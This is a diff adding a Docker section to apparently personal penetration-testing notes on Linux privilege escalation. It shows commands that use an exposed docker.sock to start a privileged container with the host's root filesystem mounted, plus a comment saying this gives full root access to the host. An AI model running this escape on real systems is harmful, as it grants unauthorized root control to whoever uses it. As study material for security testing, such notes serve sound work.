@@ -317,3 +317,8 @@ $ lxc exec privesc /bin/bash
 %% Once we have done that, we can start the container and log into it. In the container, we can then go to the path we specified to access the resource of the host system as root. %%
 
 ### Docker
+```
+$ /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
+$ /tmp/docker -H unix:///app/docker.sock ps
+```
+%% We can create our own Docker container that maps the host’s root directory (/) to the /hostsystem directory on the container. With this, we will get full access to the host system. Therefore, we must map these directories accordingly and use the main_app Docker image. %%
